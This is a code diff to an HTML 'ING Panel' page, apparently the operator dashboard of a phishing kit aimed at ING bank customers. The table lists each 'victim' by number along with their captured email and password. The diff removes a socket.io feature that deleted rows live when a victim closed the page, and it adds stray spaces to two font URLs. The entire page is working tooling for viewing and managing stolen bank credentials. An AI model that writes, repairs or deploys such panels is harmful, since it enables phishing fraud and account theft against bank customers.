@@ -1,11 +1,12 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>ING Panel</title>
-  <link rel="preconnect" href="https://rsms.me">
-  <link rel="stylesheet" href="https://rsms.me/inter/inter.css">
+  <link rel="preconnect" href="https://rsms.me  ">
+  <link rel="stylesheet" href="https://rsms.me/inter/inter.css  ">
   <style>
     :root {
       --bg: #000000;
@@ -77,7 +78,6 @@
     </div>
   </div>
 
-  <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
   <script>
     let currentSid = null;
     const qs = s => document.querySelector(s);
@@ -109,7 +109,7 @@
       if(!d.sessions.length){ body.innerHTML=''; empty.style.display='block'; return; }
       empty.style.display='none';
       body.innerHTML = d.sessions.map(s=>`
-        <tr data-sid="${s.sid}">
+        <tr>
           <td>${s.victimNum}</td>
           <td><span class="cred">${s.email||'—'}</span></td>
           <td><span class="cred">${s.password||'—'}</span></td>
@@ -151,13 +151,6 @@
       await fetch('/api/panel',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action,sid})});
       closeModal(); load();
     }
-
-    /* ----------  LIVE DELETE WHEN VICTIM CLOSES PAGE  ---------- */
-    const socket = io();
-    socket.on('del', sid => {
-      const row = document.querySelector(`tr[data-sid="${sid}"]`);
-      if (row) row.remove();
-    });
 
     /* ----------  POLL  ---------- */
     let jsonData = {};
